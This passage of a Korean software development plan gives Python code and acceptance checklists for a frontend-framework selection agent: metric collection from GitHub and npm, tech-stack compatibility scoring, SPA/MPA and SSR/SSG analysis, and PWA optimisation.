            npm_downloads_weekly=results[1]['downloads'],
            npm_packages_count=results[1]['packages_count'],
            stackoverflow_questions=results[2]['question_count'],
            contributors_count=results[0]['contributors'],
            last_commit_date=results[0]['last_commit'],
            release_frequency=results[0]['release_frequency'],
            documentation_quality=results[3]['quality_score'],
            learning_resources=results[3]['resource_count'],
            job_postings=results[4]['job_count'],
            community_activity_score=results[5]['activity_score']
        )

        # 캐시 저장
        self.metrics_cache[cache_key] = metrics

        return metrics

    async def _fetch_github_metrics(
        self,
        framework: str
    ) -> Dict[str, Any]:
        """GitHub 메트릭 수집"""

        # 프레임워크별 GitHub 저장소
        repo_map = {
            'react': 'facebook/react',
            'vue': 'vuejs/core',
            'angular': 'angular/angular',
            'svelte': 'sveltejs/svelte',
            'nextjs': 'vercel/next.js',
            'flutter': 'flutter/flutter'
        }

        repo = repo_map.get(framework)
        if not repo:
            return self._default_github_metrics()

        async with aiohttp.ClientSession() as session:
            headers = {'Authorization': f'token {self.github_token}'}

            # 저장소 정보
            repo_url = f'https://api.github.com/repos/{repo}'
            async with session.get(repo_url, headers=headers) as resp:
                repo_data = await resp.json()

            # 기여자 수
            contrib_url = f'{repo_url}/contributors?per_page=1'
            async with session.get(contrib_url, headers=headers) as resp:
                # Link 헤더에서 총 페이지 수 추출
                link_header = resp.headers.get('Link', '')
                contributors = self._parse_link_header_count(link_header)

            # 릴리스 빈도
            releases_url = f'{repo_url}/releases?per_page=100'
            async with session.get(releases_url, headers=headers) as resp:
                releases = await resp.json()
                release_frequency = self._calculate_release_frequency(releases)

            return {
                'stars': repo_data.get('stargazers_count', 0),
                'contributors': contributors,
                'last_commit': datetime.fromisoformat(
                    repo_data.get('pushed_at', '').replace('Z', '+00:00')
                ),
                'release_frequency': release_frequency,
                'forks': repo_data.get('forks_count', 0),
                'open_issues': repo_data.get('open_issues_count', 0)
            }

    async def _fetch_npm_metrics(
        self,
        framework: str
    ) -> Dict[str, Any]:
        """NPM 메트릭 수집"""

        # 프레임워크별 NPM 패키지명
        package_map = {
            'react': 'react',
            'vue': 'vue',
            'angular': '@angular/core',
            'svelte': 'svelte',
            'nextjs': 'next',
            'flutter': None  # Flutter는 NPM 사용 안함
        }

        package_name = package_map.get(framework)
        if not package_name:
            return {'downloads': 0, 'packages_count': 0}

        async with aiohttp.ClientSession() as session:
            # 주간 다운로드 수
            downloads_url = f'https://api.npmjs.org/downloads/point/last-week/{package_name}'
            async with session.get(downloads_url) as resp:
                downloads_data = await resp.json()

            # 관련 패키지 수 (ecosystem size)
            search_url = f'https://registry.npmjs.org/-/v1/search?text={framework}&size=1'
            async with session.get(search_url) as resp:
                search_data = await resp.json()

            return {
                'downloads': downloads_data.get('downloads', 0),
                'packages_count': search_data.get('total', 0)
            }

    async def _fetch_stackoverflow_metrics(
        self,
        framework: str
    ) -> Dict[str, Any]:
        """Stack Overflow 메트릭 수집"""

        tag_map = {
            'react': 'reactjs',
            'vue': 'vue.js',
            'angular': 'angular',
            'svelte': 'svelte',
            'nextjs': 'next.js',
            'flutter': 'flutter'
        }

        tag = tag_map.get(framework, framework)

        async with aiohttp.ClientSession() as session:
            url = f'{self.stackoverflow_api}/questions'
            params = {
                'tagged': tag,
                'site': 'stackoverflow',
                'filter': 'total'
            }

            async with session.get(url, params=params) as resp:
                data = await resp.json()

            return {
                'question_count': data.get('total', 0),
                'answered_percentage': self._calculate_answered_percentage(data)
            }

    async def _analyze_documentation(
        self,
        framework: str
    ) -> Dict[str, Any]:
        """문서화 품질 분석"""

        # 문서화 품질 평가 기준
        doc_scores = {
            'react': {
                'quality_score': 8.5,
                'completeness': 0.9,
                'examples': 'extensive',
                'api_reference': 'complete',
                'tutorials': 'comprehensive'
            },
            'vue': {
                'quality_score': 9.5,
                'completeness': 0.95,
                'examples': 'excellent',
                'api_reference': 'complete',
                'tutorials': 'comprehensive'
            },
            'angular': {
                'quality_score': 9.0,
                'completeness': 0.92,
                'examples': 'extensive',
                'api_reference': 'complete',
                'tutorials': 'comprehensive'
            },
            'svelte': {
                'quality_score': 8.8,
                'completeness': 0.88,
                'examples': 'good',
                'api_reference': 'complete',
                'tutorials': 'interactive'
            }
        }

        # 학습 리소스 수 추정
        resource_counts = {
            'react': 5000,
            'vue': 3000,
            'angular': 4000,
            'svelte': 1500,
            'nextjs': 2000,
            'flutter': 3500
        }

        doc_info = doc_scores.get(framework, {'quality_score': 7.0})

        return {
            'quality_score': doc_info['quality_score'],
            'resource_count': resource_counts.get(framework, 1000)
        }

    async def _analyze_community_activity(
        self,
        framework: str
    ) -> Dict[str, Any]:
        """커뮤니티 활동성 분석"""

        # 여러 지표를 종합한 활동성 점수
        activity_factors = {
            'github_issues_resolved_weekly': await self._get_issues_activity(framework),
            'discord_members': self._estimate_discord_size(framework),
            'reddit_subscribers': await self._get_reddit_metrics(framework),
            'twitter_mentions_daily': self._estimate_twitter_activity(framework),
            'conference_talks_yearly': self._count_conference_talks(framework)
        }

        # 가중치 적용
        weights = {
            'github_issues_resolved_weekly': 0.3,
            'discord_members': 0.2,
            'reddit_subscribers': 0.2,
            'twitter_mentions_daily': 0.2,
            'conference_talks_yearly': 0.1
        }

        # 정규화 및 점수 계산
        normalized_scores = {}
        max_values = {
            'github_issues_resolved_weekly': 500,
            'discord_members': 50000,
            'reddit_subscribers': 500000,
            'twitter_mentions_daily': 1000,
            'conference_talks_yearly': 100
        }

        for factor, value in activity_factors.items():
            normalized = min(value / max_values[factor], 1.0)
            normalized_scores[factor] = normalized * weights[factor]

        activity_score = sum(normalized_scores.values()) * 10  # 0-10 scale

        return {
            'activity_score': activity_score,
            'factors': activity_factors
        }
```

**검증 기준**:

- [ ] GitHub, NPM, StackOverflow API 통합
- [ ] 실시간 데이터 수집
- [ ] 커뮤니티 활동성 지표
- [ ] 문서화 품질 평가

---

### SubTask 4.12.4: 기술 스택 호환성 검사

**담당자**: 시스템 통합 전문가  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/compatibility_checker.py
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass
from enum import Enum

@dataclass
class CompatibilityIssue:
    severity: str  # 'critical', 'major', 'minor'
    component: str
    issue_type: str
    description: str
    solution: Optional[str]

@dataclass
class CompatibilityReport:
    framework: str
    overall_score: float  # 0-1
    compatible_technologies: List[str]
    incompatible_technologies: List[str]
    issues: List[CompatibilityIssue]
    migration_complexity: str  # 'low', 'medium', 'high'
    recommendations: List[str]

class TechStackCompatibilityChecker:
    """기술 스택 호환성 검사기"""

    def __init__(self):
        self.compatibility_matrix = self._build_compatibility_matrix()
        self.integration_patterns = self._load_integration_patterns()

    def _build_compatibility_matrix(self) -> Dict[str, Dict[str, float]]:
        """기술 호환성 매트릭스 구축"""

        return {
            'react': {
                # 백엔드
                'nodejs': 1.0,
                'python': 0.9,
                'java': 0.8,
                'dotnet': 0.8,
                'go': 0.9,
                'ruby': 0.7,

                # 상태 관리
                'redux': 1.0,
                'mobx': 0.9,
                'zustand': 1.0,
                'recoil': 1.0,

                # 스타일링
                'css-modules': 1.0,
                'styled-components': 1.0,
                'emotion': 1.0,
                'tailwind': 1.0,
                'sass': 0.9,

                # 빌드 도구
                'webpack': 1.0,
                'vite': 0.9,
                'parcel': 0.8,
                'rollup': 0.7,

                # 테스팅
                'jest': 1.0,
                'react-testing-library': 1.0,
                'cypress': 1.0,
                'playwright': 0.9,

                # 타입 시스템
                'typescript': 1.0,
                'flow': 0.8,
                'propTypes': 0.7
            },
            'vue': {
                'nodejs': 1.0,
                'python': 0.9,
                'java': 0.8,
                'vuex': 1.0,
                'pinia': 1.0,
                'vue-router': 1.0,
                'nuxt': 1.0,
                'tailwind': 1.0,
                'vite': 1.0,
                'vitest': 1.0,
                'typescript': 0.9
            },
            'angular': {
                'nodejs': 1.0,
                'dotnet': 0.9,
                'java': 0.9,
                'rxjs': 1.0,
                'ngrx': 1.0,
                'angular-material': 1.0,
                'typescript': 1.0,  # 필수
                'karma': 1.0,
                'jasmine': 1.0,
                'protractor': 0.7  # deprecated
            }
            # ... 더 많은 프레임워크
        }

    async def check_compatibility(
        self,
        framework: str,
        tech_stack: Dict[str, List[str]]
    ) -> CompatibilityReport:
        """기술 스택 호환성 검사"""

        compatible = []
        incompatible = []
        issues = []

        compatibility_scores = []

        # 각 기술 카테고리별 검사
        for category, technologies in tech_stack.items():
            for tech in technologies:
                compatibility = self._get_compatibility_score(framework, tech)

                if compatibility >= 0.8:
                    compatible.append(tech)
                elif compatibility >= 0.5:
                    compatible.append(tech)
                    issues.append(CompatibilityIssue(
                        severity='minor',
                        component=tech,
                        issue_type='partial_compatibility',
                        description=f"{tech} has partial compatibility with {framework}",
                        solution=self._suggest_solution(framework, tech)
                    ))
                else:
                    incompatible.append(tech)
                    issues.append(CompatibilityIssue(
                        severity='major',
                        component=tech,
                        issue_type='incompatibility',
                        description=f"{tech} is not recommended with {framework}",
                        solution=self._suggest_alternative(framework, tech, category)
                    ))

                compatibility_scores.append(compatibility)

        # 전체 호환성 점수
        overall_score = sum(compatibility_scores) / len(compatibility_scores) if compatibility_scores else 0

        # 마이그레이션 복잡도 평가
        migration_complexity = self._assess_migration_complexity(
            framework,
            tech_stack,
            issues
        )

        # 권장사항 생성
        recommendations = self._generate_recommendations(
            framework,
            tech_stack,
            issues
        )

        return CompatibilityReport(
            framework=framework,
            overall_score=overall_score,
            compatible_technologies=compatible,
            incompatible_technologies=incompatible,
            issues=issues,
            migration_complexity=migration_complexity,
            recommendations=recommendations
        )

    def _get_compatibility_score(
        self,
        framework: str,
        technology: str
    ) -> float:
        """개별 기술 호환성 점수 조회"""

        # 직접 매핑 확인
        if framework in self.compatibility_matrix:
            if technology in self.compatibility_matrix[framework]:
                return self.compatibility_matrix[framework][technology]

        # 유사 기술 확인
        similar_tech = self._find_similar_technology(technology)
        if similar_tech and framework in self.compatibility_matrix:
            if similar_tech in self.compatibility_matrix[framework]:
                return self.compatibility_matrix[framework][similar_tech] * 0.9

        # 카테고리 기반 추정
        category_compatibility = self._estimate_by_category(framework, technology)
        if category_compatibility is not None:
            return category_compatibility

        # 기본값
        return 0.5

    def _suggest_alternative(
        self,
        framework: str,
        incompatible_tech: str,
        category: str
    ) -> str:
        """호환되지 않는 기술의 대안 제시"""

        alternatives = {
            ('react', 'angular-material'): 'Consider using Material-UI or Ant Design',
            ('vue', 'redux'): 'Use Vuex or Pinia for state management',
            ('angular', 'styled-components'): 'Use Angular\'s built-in styling or CSS modules',
            ('svelte', 'react-router'): 'Use SvelteKit\'s built-in routing'
        }

        key = (framework, incompatible_tech)
        if key in alternatives:
            return alternatives[key]

        # 카테고리별 일반 대안
        category_alternatives = {
            'state_management': {
                'react': 'Redux, Zustand, or Context API',
                'vue': 'Vuex or Pinia',
                'angular': 'NgRx or Akita'
            },
            'routing': {
                'react': 'React Router or Reach Router',
                'vue': 'Vue Router',
                'angular': 'Angular Router'
            }
        }

        if category in category_alternatives:
            if framework in category_alternatives[category]:
                return f"Use {category_alternatives[category][framework]}"

        return "Consider framework-specific alternatives"

    async def check_integration_patterns(
        self,
        framework: str,
        backend_stack: List[str]
    ) -> Dict[str, Any]:
        """백엔드 통합 패턴 검사"""

        integration_analysis = {
            'recommended_patterns': [],
            'api_styles': [],
            'authentication_methods': [],
            'data_fetching_libraries': [],
            'real_time_options': []
        }

        # API 스타일 추천
        if 'graphql' in backend_stack:
            if framework == 'react':
                integration_analysis['data_fetching_libraries'].extend([
                    'Apollo Client',
                    'Relay',
                    'urql'
                ])
            elif framework == 'vue':
                integration_analysis['data_fetching_libraries'].extend([
                    'Apollo Client',
                    'Villus'
                ])
        else:  # REST API
            if framework == 'react':
                integration_analysis['data_fetching_libraries'].extend([
                    'React Query',
                    'SWR',
                    'Axios'
                ])
            elif framework == 'vue':
                integration_analysis['data_fetching_libraries'].extend([
                    'Axios',
                    'Vue Query'
                ])

        # 실시간 통신
        if any(tech in backend_stack for tech in ['socketio', 'websocket']):
            integration_analysis['real_time_options'] = self._get_realtime_options(framework)

        # 인증 방식
        integration_analysis['authentication_methods'] = self._get_auth_methods(framework, backend_stack)

        return integration_analysis
```

**검증 기준**:

- [ ] 포괄적인 호환성 매트릭스
- [ ] 기술별 호환성 점수
- [ ] 대안 제시 시스템
- [ ] 통합 패턴 분석

---

## Task 4.13: 프로젝트 유형별 최적화

### SubTask 4.13.1: SPA/MPA 프로젝트 분석기

**담당자**: 웹 아키텍처 전문가  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/spa_mpa_analyzer.py
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

class ApplicationType(Enum):
    SPA = "single_page_application"
    MPA = "multi_page_application"
    HYBRID = "hybrid_application"

@dataclass
class ApplicationTypeAnalysis:
    recommended_type: ApplicationType
    confidence: float
    reasons: List[str]
    framework_recommendations: List[str]
    architecture_pattern: str
    optimization_strategies: List[str]
    potential_challenges: List[str]

class SPAMPAAnalyzer:
    """SPA/MPA 프로젝트 타입 분석기"""

    def __init__(self):
        self.type_indicators = self._initialize_indicators()
        self.framework_suitability = self._define_framework_suitability()

    def _initialize_indicators(self) -> Dict[str, Dict[str, float]]:
        """애플리케이션 타입 지표 초기화"""
        return {
            'spa_indicators': {
                'real_time_updates': 0.9,
                'complex_interactions': 0.8,
                'desktop_like_experience': 0.9,
                'single_product_focus': 0.7,
                'authenticated_app': 0.8,
                'data_visualization': 0.8,
                'collaborative_features': 0.9,
                'offline_capability': 0.7
            },
            'mpa_indicators': {
                'seo_critical': 0.9,
                'content_heavy': 0.8,
                'multiple_landing_pages': 0.9,
                'simple_interactions': 0.7,
                'progressive_enhancement': 0.8,
                'fast_initial_load': 0.8,
                'separate_sections': 0.8,
                'cms_integration': 0.7
            }
        }

    async def analyze_application_type(
        self,
        requirements: ProjectRequirements
    ) -> ApplicationTypeAnalysis:
        """애플리케이션 타입 분석"""

        # 점수 계산
        spa_score = self._calculate_spa_score(requirements)
        mpa_score = self._calculate_mpa_score(requirements)

        # 타입 결정
        if spa_score > mpa_score * 1.2:
            recommended_type = ApplicationType.SPA
        elif mpa_score > spa_score * 1.2:
            recommended_type = ApplicationType.MPA
        else:
            recommended_type = ApplicationType.HYBRID

        # 신뢰도 계산
        confidence = abs(spa_score - mpa_score) / max(spa_score, mpa_score)

        # 이유 생성
        reasons = self._generate_type_reasons(
            recommended_type,
            spa_score,
            mpa_score,
            requirements
        )

        # 프레임워크 추천
        framework_recommendations = self._recommend_frameworks_for_type(
            recommended_type,
            requirements
        )

        # 아키텍처 패턴
        architecture_pattern = self._suggest_architecture_pattern(
            recommended_type,
            requirements
        )

        # 최적화 전략
        optimization_strategies = self._define_optimization_strategies(
            recommended_type,
            requirements
        )

        # 잠재적 도전과제
        potential_challenges = self._identify_challenges(
            recommended_type,
            requirements
        )

        return ApplicationTypeAnalysis(
            recommended_type=recommended_type,
            confidence=confidence,
            reasons=reasons,
            framework_recommendations=framework_recommendations,
            architecture_pattern=architecture_pattern,
            optimization_strategies=optimization_strategies,
            potential_challenges=potential_challenges
        )

    def _calculate_spa_score(
        self,
        requirements: ProjectRequirements
    ) -> float:
        """SPA 적합도 점수 계산"""

        score = 0.0
        indicators = self.type_indicators['spa_indicators']

        # 요구사항 텍스트 분석
        requirement_text = ' '.join(requirements.technical_requirements).lower()

        for indicator, weight in indicators.items():
            if self._check_indicator_presence(indicator, requirement_text):
                score += weight

        # 추가 요인
        if requirements.project_type == 'dashboard':
            score += 0.5
        if 'mobile' not in requirement_text and 'seo' not in requirement_text:
            score += 0.3
        if requirements.scale in ['enterprise', 'large']:
            score += 0.2

        return score

    def _recommend_frameworks_for_type(
        self,
        app_type: ApplicationType,
        requirements: ProjectRequirements
    ) -> List[str]:
        """애플리케이션 타입별 프레임워크 추천"""

        recommendations = []

        if app_type == ApplicationType.SPA:
            # SPA에 적합한 프레임워크
            spa_frameworks = [
                ('react', 0.9),
                ('vue', 0.85),
                ('angular', 0.85),
                ('svelte', 0.8)
            ]

            # 팀 경험 고려
            for fw, base_score in spa_frameworks:
                score = base_score
                if fw in requirements.team_expertise:
                    score += 0.1
                recommendations.append((fw, score))

        elif app_type == ApplicationType.MPA:
            # MPA에 적합한 프레임워크
            mpa_frameworks = [
                ('nextjs', 0.95),
                ('nuxtjs', 0.9),
                ('sveltekit', 0.85),
                ('remix', 0.8),
                ('astro', 0.8)
            ]

            for fw, base_score in mpa_frameworks:
                score = base_score
                # SEO 요구사항이 있으면 가점
                if 'seo' in str(requirements.technical_requirements).lower():
                    score += 0.05
                recommendations.append((fw, score))

        else:  # HYBRID
            # 하이브리드에 적합한 프레임워크
            hybrid_frameworks = [
                ('nextjs', 0.95),
                ('nuxtjs', 0.9),
                ('sveltekit', 0.85)
            ]

            for fw, base_score in hybrid_frameworks:
                recommendations.append((fw, base_score))

        # 점수 기준 정렬
        recommendations.sort(key=lambda x: x[1], reverse=True)

        return [fw for fw, _ in recommendations[:5]]

    def _suggest_architecture_pattern(
        self,
        app_type: ApplicationType,
        requirements: ProjectRequirements
    ) -> str:
        """아키텍처 패턴 제안"""

        if app_type == ApplicationType.SPA:
            if requirements.scale == 'enterprise':
                return "Micro-Frontend Architecture with Module Federation"
            elif 'real-time' in str(requirements.technical_requirements):
                return "Event-Driven Architecture with WebSocket Integration"
            else:
                return "Component-Based Architecture with Centralized State Management"

        elif app_type == ApplicationType.MPA:
            if 'ecommerce' in str(requirements.description):
                return "JAMstack Architecture with Static Generation"
            elif 'cms' in str(requirements.technical_requirements):
                return "Headless CMS with Server-Side Rendering"
            else:
                return "Traditional Server-Side MVC Architecture"

        else:  # HYBRID
            return "Islands Architecture with Partial Hydration"

    def _define_optimization_strategies(
        self,
        app_type: ApplicationType,
        requirements: ProjectRequirements
    ) -> List[str]:
        """최적화 전략 정의"""

        strategies = []

        if app_type == ApplicationType.SPA:
            strategies.extend([
                "Implement code splitting for optimal bundle sizes",
                "Use lazy loading for route-based components",
                "Implement service workers for offline capability",
                "Optimize initial bundle with tree shaking",
                "Use skeleton screens for perceived performance",
                "Implement virtual scrolling for large lists"
            ])

        elif app_type == ApplicationType.MPA:
            strategies.extend([
                "Implement aggressive caching strategies",
                "Use CDN for static asset delivery",
                "Optimize server response times",
                "Implement critical CSS inlining",
                "Use resource hints (prefetch, preconnect)",
                "Optimize images with next-gen formats"
            ])

        else:  # HYBRID
            strategies.extend([
                "Implement selective hydration",
                "Use static generation for marketing pages",
                "Apply SSR for dynamic content",
                "Implement edge caching strategies",
                "Use progressive enhancement",
                "Optimize for Core Web Vitals"
            ])

        return strategies
```

**검증 기준**:

- [ ] SPA/MPA/Hybrid 타입 자동 판별
- [ ] 타입별 프레임워크 추천
- [ ] 아키텍처 패턴 제안
- [ ] 최적화 전략 제공

---

### SubTask 4.13.2: SSR/SSG 요구사항 처리

**담당자**: 풀스택 개발자  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/ssr_ssg_handler.py
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

class RenderingStrategy(Enum):
    CSR = "client_side_rendering"
    SSR = "server_side_rendering"
    SSG = "static_site_generation"
    ISR = "incremental_static_regeneration"
    HYBRID = "hybrid_rendering"

@dataclass
class RenderingAnalysis:
    recommended_strategy: RenderingStrategy
    seo_score: float  # 0-10
    performance_score: float  # 0-10
    complexity_score: float  # 0-10
    framework_compatibility: Dict[str, float]
    implementation_guide: Dict[str, Any]
    caching_strategy: Dict[str, Any]
    deployment_recommendations: List[str]

class SSRSSGHandler:
    """SSR/SSG 요구사항 처리기"""

    def __init__(self):
        self.rendering_patterns = self._initialize_patterns()
        self.seo_requirements = self._define_seo_requirements()

    def _initialize_patterns(self) -> Dict[str, Dict[str, Any]]:
        """렌더링 패턴 초기화"""
        return {
            'ssr': {
                'use_cases': [
                    'dynamic_content',
                    'user_specific_data',
                    'real_time_data',
                    'authenticated_pages',
                    'personalized_content'
                ],
                'frameworks': {
                    'nextjs': 1.0,
                    'nuxtjs': 1.0,
                    'sveltekit': 0.9,
                    'remix': 0.9,
                    'gatsby': 0.3,  # 주로 SSG
                    'react': 0.6,   # 추가 설정 필요
                    'vue': 0.6,
                    'angular': 0.7
                },
                'benefits': [
                    'immediate_seo_benefits',
                    'faster_initial_paint',
                    'better_social_sharing',
                    'no_js_fallback'
                ],
                'challenges': [
                    'server_resources',
                    'increased_complexity',
                    'ttfb_concerns',
                    'caching_complexity'
                ]
            },
            'ssg': {
                'use_cases': [
                    'marketing_sites',
                    'documentation',
                    'blogs',
                    'portfolio_sites',
                    'landing_pages'
                ],
                'frameworks': {
                    'gatsby': 1.0,
                    'nextjs': 0.9,
                    'nuxtjs': 0.8,
                    'hugo': 0.9,
                    'astro': 0.9,
                    'eleventy': 0.8,
                    'sveltekit': 0.8
                },
                'benefits': [
                    'best_performance',
                    'perfect_seo',
                    'cdn_friendly',
                    'low_hosting_cost',
                    'high_security'
                ],
                'challenges': [
                    'build_time_scaling',
                    'dynamic_content_limitation',
                    'frequent_updates_difficulty'
                ]
            },
            'isr': {
                'use_cases': [
                    'ecommerce_catalog',
                    'news_sites',
                    'large_content_sites',
                    'frequently_updated_content'
                ],
                'frameworks': {
                    'nextjs': 1.0,
                    'nuxtjs': 0.7,
                    'sveltekit': 0.6
                },
                'benefits': [
                    'best_of_both_worlds',
                    'scalable_builds',
                    'fresh_content',
                    'good_performance'
                ]
            }
        }

    async def analyze_rendering_requirements(
        self,
        requirements: ProjectRequirements
    ) -> RenderingAnalysis:
        """렌더링 요구사항 분석"""

        # 렌더링 전략 점수 계산
        scores = {
            RenderingStrategy.CSR: self._calculate_csr_score(requirements),
            RenderingStrategy.SSR: self._calculate_ssr_score(requirements),
            RenderingStrategy.SSG: self._calculate_ssg_score(requirements),
            RenderingStrategy.ISR: self._calculate_isr_score(requirements)
        }

        # 최적 전략 선택
        recommended_strategy = max(scores, key=scores.get)

        # 하이브리드 전략 검토
        if self._should_use_hybrid(scores, requirements):
            recommended_strategy = RenderingStrategy.HYBRID

        # SEO 점수 계산
        seo_score = self._calculate_seo_score(recommended_strategy, requirements)

        # 성능 점수 계산
        performance_score = self._calculate_performance_score(
            recommended_strategy,
            requirements
        )

        # 복잡도 점수 계산
        complexity_score = self._calculate_complexity_score(
            recommended_strategy,
            requirements
        )

        # 프레임워크 호환성
        framework_compatibility = self._get_framework_compatibility(
            recommended_strategy
        )

        # 구현 가이드 생성
        implementation_guide = await self._generate_implementation_guide(
            recommended_strategy,
            requirements
        )

        # 캐싱 전략
        caching_strategy = self._define_caching_strategy(
            recommended_strategy,
            requirements
        )

        # 배포 권장사항
        deployment_recommendations = self._generate_deployment_recommendations(
            recommended_strategy
        )

        return RenderingAnalysis(
            recommended_strategy=recommended_strategy,
            seo_score=seo_score,
            performance_score=performance_score,
            complexity_score=complexity_score,
            framework_compatibility=framework_compatibility,
            implementation_guide=implementation_guide,
            caching_strategy=caching_strategy,
            deployment_recommendations=deployment_recommendations
        )

    def _calculate_ssr_score(
        self,
        requirements: ProjectRequirements
    ) -> float:
        """SSR 적합도 점수 계산"""

        score = 0.0
        requirement_text = ' '.join(requirements.technical_requirements).lower()

        # SSR 긍정 지표
        ssr_indicators = {
            'seo': 2.0,
            'social sharing': 1.5,
            'dynamic content': 1.5,
            'personalized': 1.5,
            'user-specific': 1.5,
            'real-time': 1.0,
            'authenticated': 1.0,
            'server-side': 2.0
        }

        for indicator, weight in ssr_indicators.items():
            if indicator in requirement_text:
                score += weight

        # SSR 부정 지표
        if 'static' in requirement_text:
            score -= 1.0
        if 'offline' in requirement_text:
            score -= 0.5
        if requirements.scale == 'prototype':
            score -= 1.0

        return max(0, score)

    def _calculate_ssg_score(
        self,
        requirements: ProjectRequirements
    ) -> float:
        """SSG 적합도 점수 계산"""

        score = 0.0
        requirement_text = ' '.join(requirements.technical_requirements).lower()

        # SSG 긍정 지표
        ssg_indicators = {
            'static': 2.0,
            'blog': 2.0,
            'documentation': 2.0,
            'marketing': 1.5,
            'landing page': 1.5,
            'portfolio': 1.5,
            'performance': 1.0,
            'cdn': 1.0,
            'fast': 1.0
        }

        for indicator, weight in ssg_indicators.items():
            if indicator in requirement_text:
                score += weight

        # SSG 부정 지표
        if 'dynamic' in requirement_text:
            score -= 1.5
        if 'real-time' in requirement_text:
            score -= 2.0
        if 'user-specific' in requirement_text:
            score -= 1.5

        return max(0, score)

    async def _generate_implementation_guide(
        self,
        strategy: RenderingStrategy,
        requirements: ProjectRequirements
    ) -> Dict[str, Any]:
        """구현 가이드 생성"""

        guide = {
            'setup_steps': [],
            'key_configurations': {},
            'best_practices': [],
            'anti_patterns': [],
            'example_code': {}
        }

        if strategy == RenderingStrategy.SSR:
            guide['setup_steps'] = [
                "1. Choose SSR-capable framework (Next.js/Nuxt.js recommended)",
                "2. Configure server runtime environment",
                "3. Set up data fetching on server",
                "4. Implement proper error boundaries",
                "5. Configure caching headers"
            ]

            guide['key_configurations'] = {
                'nextjs': {
                    'getServerSideProps': 'For page-level data fetching',
                    'middleware': 'For request interception',
                    'api_routes': 'For backend functionality'
                }
            }

            guide['best_practices'] = [
                "Minimize server-side data fetching",
                "Implement proper caching strategies",
                "Use streaming where possible",
                "Optimize database queries",
                "Monitor server performance"
            ]

            guide['example_code']['nextjs'] = """
// pages/products/[id].js
export async function getServerSideProps({ params }) {
  const res = await fetch(`https://api.example.com/products/${params.id}`)
  const product = await res.json()

  return {
    props: { product },
  }
}

export default function Product({ product }) {
  return <ProductDetails product={product} />
}
"""

        elif strategy == RenderingStrategy.SSG:
            guide['setup_steps'] = [
                "1. Choose SSG framework (Gatsby/Next.js recommended)",
                "2. Set up content sources (CMS/Markdown)",
                "3. Configure build pipeline",
                "4. Implement incremental builds",
                "5. Set up CDN deployment"
            ]

            guide['key_configurations'] = {
                'gatsby': {
                    'gatsby-node.js': 'For programmatic page creation',
                    'gatsby-config.js': 'For plugin configuration',
                    'graphql': 'For data querying'
                }
            }

            guide['example_code']['gatsby'] = """
// gatsby-node.js
exports.createPages = async ({ graphql, actions }) => {
  const { createPage } = actions
  const result = await graphql(`
    query {
      allMarkdownRemark {
        edges {
          node {
            frontmatter {
              slug
            }
          }
        }
      }
    }
  `)

  result.data.allMarkdownRemark.edges.forEach(({ node }) => {
    createPage({
      path: node.frontmatter.slug,
      component: path.resolve('./src/templates/blog-post.js'),
      context: {
        slug: node.frontmatter.slug,
      },
    })
  })
}
"""

        return guide

    def _define_caching_strategy(
        self,
        strategy: RenderingStrategy,
        requirements: ProjectRequirements
    ) -> Dict[str, Any]:
        """캐싱 전략 정의"""

        caching = {
            'browser_cache': {},
            'cdn_cache': {},
            'server_cache': {},
            'api_cache': {}
        }

        if strategy == RenderingStrategy.SSR:
            caching['server_cache'] = {
                'strategy': 'LRU with TTL',
                'ttl': '5 minutes for dynamic, 1 hour for semi-static',
                'invalidation': 'Event-based or time-based',
                'implementation': 'Redis or in-memory cache'
            }

            caching['cdn_cache'] = {
                'strategy': 'Short TTL with stale-while-revalidate',
                'headers': {
                    'Cache-Control': 's-maxage=60, stale-while-revalidate=86400'
                }
            }

        elif strategy == RenderingStrategy.SSG:
            caching['cdn_cache'] = {
                'strategy': 'Long TTL with cache busting',
                'headers': {
                    'Cache-Control': 'public, max-age=31536000, immutable'
                },
                'invalidation': 'Path-based on deploy'
            }

            caching['browser_cache'] = {
                'strategy': 'Aggressive caching for assets',
                'service_worker': 'Cache-first strategy'
            }

        return caching
```

**검증 기준**:

- [ ] CSR/SSR/SSG/ISR 전략 분석
- [ ] SEO 최적화 가이드
- [ ] 성능 최적화 전략
- [ ] 프레임워크별 구현 예제

---

### SubTask 4.13.3: PWA 및 모바일 웹 최적화

**담당자**: 모바일 웹 전문가  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/pwa_mobile_optimizer.py
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass

@dataclass
class PWAAnalysis:
    pwa_score: float  # 0-10
    recommended_features: List[str]
    implementation_complexity: str
    offline_strategy: Dict[str, Any]
    performance_impact: Dict[str, float]
    platform_specific_considerations: Dict[str, Any]

@dataclass
class MobileOptimization:
    mobile_first_score: float
    responsive_strategy: str
    touch_optimization: List[str]
    performance_budget: Dict[str, Any]
    mobile_specific_features: List[str]

class PWAMobileOptimizer:
    """PWA 및 모바일 웹 최적화 분석기"""

    def __init__(self):
        self.pwa_requirements = self._define_pwa_requirements()
        self.mobile_patterns = self._initialize_mobile_patterns()

    def _define_pwa_requirements(self) -> Dict[str, Any]:
        """PWA 요구사항 정의"""
        return {
            'core_features': {
                'service_worker': {
                    'required': True,
                    'complexity': 'medium',
                    'benefits': ['offline_support', 'background_sync', 'push_notifications']
                },
                'manifest': {
                    'required': True,
                    'complexity': 'low',
                    'benefits': ['installability', 'app_like_experience']
                },
                'https': {
                    'required': True,
                    'complexity': 'low',
                    'benefits': ['security', 'modern_apis']
                }
            },
            'enhanced_features': {
                'background_sync': {
                    'complexity': 'high',
                    'use_cases': ['offline_form_submission', 'data_sync']
                },
                'push_notifications': {
                    'complexity': 'medium',
                    'use_cases': ['user_engagement', 'real_time_updates']
                },
                'web_share': {
                    'complexity': 'low',
                    'use_cases': ['social_sharing', 'native_integration']
                },
                'web_payment': {
                    'complexity': 'high',
                    'use_cases': ['ecommerce', 'seamless_checkout']
                }
            }
        }

    async def analyze_pwa_requirements(
        self,
        requirements: ProjectRequirements
    ) -> PWAAnalysis:
        """PWA 요구사항 분석"""

        # PWA 적합도 점수 계산
        pwa_score = self._calculate_pwa_score(requirements)

        # 추천 기능 결정
